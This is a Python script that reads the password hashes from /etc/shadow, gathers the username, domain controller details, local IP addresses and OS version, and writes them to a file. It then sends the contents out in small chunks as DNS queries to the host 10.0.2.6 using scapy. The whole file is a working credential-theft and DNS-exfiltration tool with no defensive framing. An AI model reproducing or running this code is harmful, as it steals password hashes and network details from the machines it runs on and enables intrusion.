#!/usr/bin/python
from netifaces import interfaces, ifaddresses, AF_INET
import getpass
from os import popen
import os.path
from scapy.all import DNS, DNSQR, IP, sr1, UDP,TCP
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time




def save_file():
    save_path="/etc/"
    name_of_the_file="tempp"
    completeName=os.path.join(save_path,name_of_the_file+".txt")
    file1=open(completeName,"w")
    file1.write("List of proccess and passwords: " +password_str + "\n\n"+"Info about this computer: \n" + "Username: "+fd_user +"domain controller name: " + fd_name +"domain controller ip: "+ fd_ip+ "Ips that are associate with this computer:\n" +str_ip)
    file1.close()
    


def print_user():
    global fd_user
    fd_user=popen("whoami").read()
    


def print_passwords():
    f=open("/etc/shadow","r")
    lines=f.readlines()
    global password_str
    password_str=""
    for i in range(len(lines)):
        netel_length=len(lines[i])
        netel=lines[i].find(":")
        if(len(lines[i])<40):
            lines[i]=lines[i][:-(netel_length-netel)]
            password_str+=(lines[i]+"\n")

        else :
            lines[i]=lines[i][:-20]
            password_str+=(lines[i]+"\n")


    
        
    
    
    


def print_ip():
    global str_ip
    str_ip=""
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        str_ip+=(' '.join(addresses)+"\n")
     

def print_domain():
    global fd_name
    global fd_ip
    fd_name=popen("domainname -A").read()
    
    fd_ip=popen("domainname -i").read()
    
def send():
    temp1=""
    f=open("/etc/tempp.txt")
    lines=f.readlines()
    for i in range(len(lines)):
        temp1+=lines[i]
         
        if(len(temp1)>30):
            temp2=temp1[30:]
            temp1=temp1[0:30]
            
            
            
            dns_req = IP(dst='10.0.2.6')/UDP(sport =53,dport=53)/DNS(rd=1, qd=DNSQR(qname=temp1))#36
            answer = sr1(dns_req, verbose=1)
            temp1=temp2
            
            time.sleep(3)
    dns_req = IP(dst='10.0.2.6')/UDP(sport =53,dport=53)/DNS(rd=1, qd=DNSQR(qname=temp1))#36
    answer = sr1(dns_req, verbose=1)
    




        


def print_os():
   fd=[i for i in popen("cat /etc/os-release").readlines() if "PRETTY_NAME" in i]
   global os_p
   os_p="Os name and version: ",fd[0][13:-2]
   
   

def main():
    print_passwords()
    print_ip()
    print_user()
    print_domain()
    print_os()
    save_file()
    send()
    
    
    
    exit()

if __name__ == "__main__":
    main()
    
    
    
